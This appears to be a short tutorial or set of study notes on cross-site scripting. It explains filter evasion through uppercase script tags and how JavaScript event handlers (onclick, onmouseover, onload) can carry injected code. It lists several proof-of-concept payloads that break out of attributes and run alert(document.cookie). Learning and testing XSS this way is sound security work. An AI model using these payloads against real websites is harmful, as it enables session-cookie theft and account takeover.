### Filter Evasion
Typically, XSS vulnerabilities can be tested by submitting arbitrary JavaScript code in any user input.

Uppercase tag instead of the lowercase to bypass filter:
```
<SCRIPT>
```

### JavaScript Event Handlers
Event handlers are the functions that allow JavaScript to `react` to specific actions on the web application.

Some handlers are:
- `onclick`: triggers whenever a user clicks on an element
- `onmouseover`: when the mouse hovers over an element
- `onload`: when an element is loaded
- `onmouseout`: when the mouse leaves an element

### Event Handlers and XSS
Event handlers can be used to enable XSS attacks, especially if script tags are filtered, as script tags aren't required for event handler code.
```
onclick=alert("Hello")

<div id="test" onclick="alert(document.cookie)">
```

```
" onclick=<script>alert(document.cookie)</script>

<script>alert(document.cookie)</script>

" onload="alert(document.cookie)
```

Input this handler and hover the mouse:
```
" onmouseover="alert(document.cookie)
```